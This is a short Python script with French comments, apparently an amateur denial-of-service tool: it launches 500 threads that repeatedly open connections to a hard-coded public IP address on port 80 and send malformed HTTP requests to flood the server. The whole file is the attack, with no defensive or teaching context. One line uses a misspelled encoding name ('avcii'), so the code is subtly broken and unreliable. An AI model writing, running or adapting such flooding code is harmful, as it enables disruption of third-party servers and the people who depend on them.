import socket
import threading

target = '51.178.36.42'
my_ip = '51.178.36.42' #adresse temporaire à changer
port= 80

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)# a verifier sur internet interé ligne
        s.connect((target, port))
        s.sendto(("GET /" + target + " http/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + my_ip + "\r\n\r\n").encode('avcii'), (target, port))
        s.close()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()

# PS recherch d'un compteur temps visuelle  "https://superuser.com/questions/611538/is-there-a-way-to-display-a-countdown-or-stopwatch-timer-in-a-terminal"
#ou time counter prossecce zsh sur google


